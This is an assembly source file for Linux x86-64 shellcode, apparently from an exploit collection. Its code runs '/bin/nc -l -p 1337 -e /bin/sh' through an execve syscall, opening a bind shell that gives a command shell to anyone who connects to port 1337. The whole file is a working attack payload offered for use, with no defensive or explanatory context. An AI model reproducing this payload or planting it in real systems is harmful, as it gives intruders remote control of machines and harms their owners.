; { Title: Shellcode linux/x86-64 bind-shell with netcat }

; Author    : Gaussillusion
; Len       : 131 bytes
; Language  : Nasm

; modified by me@tehwinsam.com

;BITS 64
xor    	rdx,rdx
mov 	rdi,0x636e2f2f6e69622f
push 	r15
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f2f6e69622f
push	r15
push 	rcx
mov	rcx,rsp

mov     rbx,0x652daaaaaaaaaaaa
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331bbbbbbbb
shr 	r10,0x20
push 	r10
mov	r10,rsp

mov	r9,0x702dcccccccccccc
shr	r9,0x30
push 	r9
mov	r9,rsp

mov 	r8,0x6c2dffffffffffff
shr	r8,0x30
push 	r8
mov	r8,rsp

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push	r9   ;push address of '-p'
push	r8   ;push address of '-l'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp
mov    	al,60
dec	al
syscall



